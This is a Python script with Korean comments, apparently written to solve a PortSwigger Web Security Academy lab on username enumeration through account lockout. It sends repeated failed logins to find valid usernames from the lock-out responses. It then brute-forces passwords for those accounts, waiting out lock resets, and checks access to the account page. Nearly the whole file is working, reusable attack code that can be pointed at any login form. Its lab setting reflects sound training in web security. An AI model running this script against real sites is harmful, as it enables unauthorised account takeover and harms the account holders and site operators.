#!/usr/bin/env python3
"""
Authentication - Username Enumeration via Account Lock
PortSwigger Lab:
  https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

계정 잠금(account lock) 로직의 결함을 이용한 username enumeration.

핵심 아이디어:
  - username 마다 일정 횟수(기본 5)의 잘못된 로그인을 연속 시도
  - username 이 유효하면 임계치 도달 후 계정이 잠기며
    "You have made too many incorrect login attempts." 응답이 나타남
  - 무효 username 은 항상 동일한 실패 응답
  → 잠금 메시지가 나타난 username 이 유효

이후:
  - 잠긴 계정이 리셋될 때까지 대기(--lock-wait)
  - password 목록을 brute-force (302 성공, 잠금 발생 시 대기 후 재개)

기존 툴(14-authentication-brute-force.py)의 목록 로더/세션을 재사용한다.

사용 예시:
  python3 14-authentication-account-lock-enum.py \\
    --target "https://LAB-ID.web-security-academy.net" --verify
"""

import argparse
import importlib.util
import os
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_BF_PATH = os.path.join(_HERE, "14-authentication-brute-force.py")


def _load_bruteforce():
    spec = importlib.util.spec_from_file_location("auth_bruteforce", _BF_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


bf = _load_bruteforce()

FAIL_MARKERS = ("invalid username or password", "incorrect password")
LOCK_MARKERS = ("too many", "locked", "incorrect login attempts")


def classify(resp) -> str:
    if resp.status_code in bf.SUCCESS_CODES:
        return "success"
    low = resp.text.lower()
    if any(m in low for m in LOCK_MARKERS):
        return "locked"
    if any(m in low for m in FAIL_MARKERS):
        return "fail"
    return "noerror"


def signature(resp) -> tuple:
    """응답을 (status_code, length) 로 요약한다."""
    return (resp.status_code, len(resp.text))


def dump_responses(login, user, attempts, invalid_pw, delay) -> None:
    """진단: 단일 username 에 대해 실제 응답을 출력한다."""
    print(f"\n[*] DUMP — username={user!r}, {attempts}회")
    for i in range(1, attempts + 1):
        try:
            resp = login.attempt(user, invalid_pw)
        except Exception as e:  # noqa: BLE001
            print(f"    [{i}] 요청 실패: {e}")
            break
        text = " ".join(resp.text.split())
        print(f"    [{i}] status={resp.status_code} len={len(resp.text)} "
              f"cat={classify(resp)}")
        print(f"        body: {text[:200]}")
        if delay:
            time.sleep(delay)


def enumerate_lock(login, usernames, attempts_per_user, invalid_pw, delay,
                   baseline_attempts=3):
    """기준(무효 username) 응답과 다른 응답이 나오는 username 을 찾는다.

    잠금 문구를 하드코딩하지 않고, 무효 username 의 기준 응답 시그니처
    (status, length) 와 달라지는 순간을 탐지한다.
    """
    import random
    baseline_user = f"no-such-user-{random.randint(100000, 999999)}"

    print(f"\n[*] 1단계 — account lock 기반 username enumeration")
    print(f"    기준 username: {baseline_user!r} (무효)")
    baseline_sigs = {}
    for _ in range(baseline_attempts):
        try:
            resp = login.attempt(baseline_user, invalid_pw)
        except Exception as e:  # noqa: BLE001
            print(f"    기준 요청 실패: {e}")
            break
        sig = signature(resp)
        baseline_sigs[sig] = baseline_sigs.get(sig, 0) + 1
        if delay:
            time.sleep(delay)
    print(f"    기준 응답 시그니처(status,length): {dict(baseline_sigs)}")
    print(f"    username 당 시도: {attempts_per_user}회")
    print(f"    {'username':<24} {'diff':>5} {'len':>6}  signatures")
    print("    " + "-" * 72)

    candidates = []
    for user in usernames:
        sigs = []
        diff_resp = None
        for _ in range(attempts_per_user):
            try:
                resp = login.attempt(user, invalid_pw)
            except Exception as e:  # noqa: BLE001
                print(f"    {user:<24} 요청 실패: {e}")
                break
            sig = signature(resp)
            sigs.append(sig)
            if sig not in baseline_sigs and diff_resp is None:
                diff_resp = resp
            if delay:
                time.sleep(delay)

        is_diff = diff_resp is not None
        maxlen = max((s[1] for s in sigs), default=0)
        uniq = sorted(set(sigs))
        note = ""
        if is_diff:
            note = f"  <== 기준과 다름 ({classify(diff_resp)})"
            candidates.append(user)
        print(f"    {user:<24} {'YES' if is_diff else '':>5} {maxlen:>6}  "
              f"{uniq}{note}")
        if is_diff:
            print(f"        diff body: {' '.join(diff_resp.text.split())[:170]}")

    return candidates


def brute_with_lock(login, username, passwords, lock_wait, delay,
                    max_lock_waits=3, wait_on_lock=False):
    """잠금을 고려하며 password 를 brute-force 한다.

    기본(wait_on_lock=False)은 잠금 응답을 실패의 한 종류로 보고 계속 진행한다.
    (성공 password 는 잠금과 무관하게 처리될 수 있으므로 대기로 시간을 낭비하지 않음)
    --wait-on-lock 지정 시에만 잠금마다 대기 후 재시도한다.
    """
    print(f"\n[*] 3단계 — password brute-force (username={username}, {len(passwords)}개)")
    print(f"    성공 기준: status {bf.SUCCESS_CODES} (또는 오류 없는 응답은 후보로 수집)")
    print(f"    잠금 대기: {'사용' if wait_on_lock else '사용 안 함(계속 진행)'}")
    print("    " + "-" * 60)

    noerror = []
    locked_seen = 0
    for i, pw in enumerate(passwords, 1):
        waits = 0
        while True:
            try:
                resp = login.attempt(username, pw)
            except Exception as e:  # noqa: BLE001
                print(f"    [{i:>3}] {pw:<20} 요청 실패: {e}")
                break
            cat = classify(resp)

            if cat == "success":
                print(f"    [{i:>3}] {pw:<20} status={resp.status_code}  <== 성공")
                print(f"\n[+] 자격증명 발견: {username} / {pw}")
                return pw
            if cat == "locked":
                locked_seen += 1
                if wait_on_lock and waits < max_lock_waits:
                    waits += 1
                    print(f"    [{i:>3}] {pw:<20} 계정 잠김 → {lock_wait}초 대기 후 재시도")
                    time.sleep(lock_wait)
                    continue
            if cat == "noerror":
                noerror.append(pw)
                print(f"    [{i:>3}] {pw:<20} 오류 없음 (status={resp.status_code}, "
                      f"len={len(resp.text)})  <== 성공 후보")
            break

        if i % 10 == 0 or i == len(passwords):
            print(f"    [{i:>3}/{len(passwords)}] 진행 중... (마지막: {pw})")
        if delay:
            time.sleep(delay)

    if noerror:
        print(f"\n[!] 오류 메시지가 없던 후보 password: {noerror}")
        if len(noerror) == 1:
            print("[+] 단일 후보 → 잠금 리셋 대기 후 검증이 필요합니다.")
            return noerror[0]
        print("    → 후보가 여러 개입니다. 수동 확인이 필요합니다.")
    else:
        print(f"\n[-] 목록 내에서 password 를 찾지 못했습니다. (잠금 응답 {locked_seen}건)")
        if locked_seen:
            print("    → 계정 잠금이 정답 검증을 막고 있을 수 있습니다. "
                  "잠금 리셋 후 --wait-on-lock 으로 재시도하세요.")
    return None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="계정 잠금 기반 username enumeration + password brute-force"
    )
    parser.add_argument("--target", required=True,
                        help="대상 베이스 URL (예: https://LAB.web-security-academy.net)")
    parser.add_argument("--login-path", default="/login",
                        help="로그인 경로 (기본값: /login)")
    parser.add_argument("--username-field", default="username",
                        help="username 파라미터 이름 (기본값: username)")
    parser.add_argument("--password-field", default="password",
                        help="password 파라미터 이름 (기본값: password)")
    parser.add_argument("--usernames", default=None,
                        help=f"username 목록 (URL/파일/인라인). 기본: {bf.DEFAULT_USERNAMES}")
    parser.add_argument("--passwords", default=None,
                        help=f"password 목록. 기본: {bf.DEFAULT_PASSWORDS}")
    parser.add_argument("--attempts-per-user", type=int, default=6,
                        help="username 당 잘못된 로그인 시도 횟수 (기본: 6)")
    parser.add_argument("--baseline-attempts", type=int, default=3,
                        help="무효 username 기준 응답 수집 횟수 (기본: 3)")
    parser.add_argument("--dump", default=None, metavar="USER",
                        help="진단: 지정한 username 의 실제 응답을 출력하고 종료")
    parser.add_argument("--invalid-password", default="invalid-password-12345",
                        help="열거 시 사용할 잘못된 password")
    parser.add_argument("--lock-wait", type=float, default=61.0,
                        help="잠금 리셋 대기 시간(초) (기본: 61)")
    parser.add_argument("--wait-on-lock", action="store_true",
                        help="password 단계에서 잠금 발생 시 대기 후 재시도 (기본: 대기 안 함)")
    parser.add_argument("--user", default=None,
                        help="이미 알고 있는 username (지정 시 enumeration 생략)")
    parser.add_argument("--session", default=None, help="기존 세션 쿠키 값 (선택)")
    parser.add_argument("--brute", dest="brute", action="store_true", default=True,
                        help="열거 후 password brute-force 수행 (기본: 수행)")
    parser.add_argument("--no-brute", dest="brute", action="store_false",
                        help="password brute-force 생략")
    parser.add_argument("--verify", action="store_true",
                        help="자격증명으로 로그인/계정 접근 검증")
    parser.add_argument("--account-path", default="/my-account",
                        help="검증 시 접근할 계정 경로 (기본: /my-account)")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="요청 간 지연(초) (기본: 0)")
    args = parser.parse_args()

    try:
        usernames = ([] if args.dump
                     else bf.load_wordlist(args.usernames, bf.DEFAULT_USERNAMES))
        passwords = (bf.load_wordlist(args.passwords, bf.DEFAULT_PASSWORDS)
                     if (args.brute and not args.dump) else [])
    except Exception as e:
        print(f"[-] 목록 로딩 실패: {e}")
        sys.exit(1)

    login = bf.LoginSession(args.target, args.login_path, args.username_field,
                            args.password_field, args.session)
    print(f"[*] 대상      : {args.target}")
    print(f"    usernames : {len(usernames)}개")
    if args.brute:
        print(f"    passwords : {len(passwords)}개")
    print(f"    CSRF      : {'획득' if login.csrf else '없음'}")

    if args.dump:
        dump_responses(login, args.dump, args.attempts_per_user,
                       args.invalid_password, args.delay)
        return

    if args.user:
        candidates = [args.user]
        print(f"\n[+] username 지정됨: {candidates} (enumeration 생략)")
    else:
        candidates = enumerate_lock(login, usernames, args.attempts_per_user,
                                    args.invalid_password, args.delay,
                                    baseline_attempts=args.baseline_attempts)

    if not candidates:
        print("\n[-] 잠금이 발생한 username 을 찾지 못했습니다.")
        print("    --attempts-per-user 증가, --invalid-password/응답 문구 확인 필요")
        sys.exit(1)

    print(f"\n[+] 유효 username 후보: {candidates}")

    if not args.brute:
        return

    # 열거 단계에서 계정이 잠겼으므로 리셋 대기 (--user 로 건너뛴 경우에도 동일 적용)
    if args.lock_wait > 0:
        print(f"\n[*] 2단계 — 계정 잠금 리셋 대기 ({args.lock_wait}초)")
        time.sleep(args.lock_wait)

    for username in candidates:
        pw = brute_with_lock(login, username, passwords, args.lock_wait, args.delay,
                             wait_on_lock=args.wait_on_lock)
        if pw:
            print(f"\n[=] 결과: {username} / {pw}")
            if args.verify:
                print(f"[*] 잠금 리셋 대기 후 검증 ({args.lock_wait}초)")
                time.sleep(max(args.lock_wait, 0))
                ok = bf.verify_login(login, username, pw, args.account_path)
                print(f"[{'✓' if ok else '?'}] 검증 {'성공' if ok else '확인 필요'}")
            return


if __name__ == "__main__":
    main()
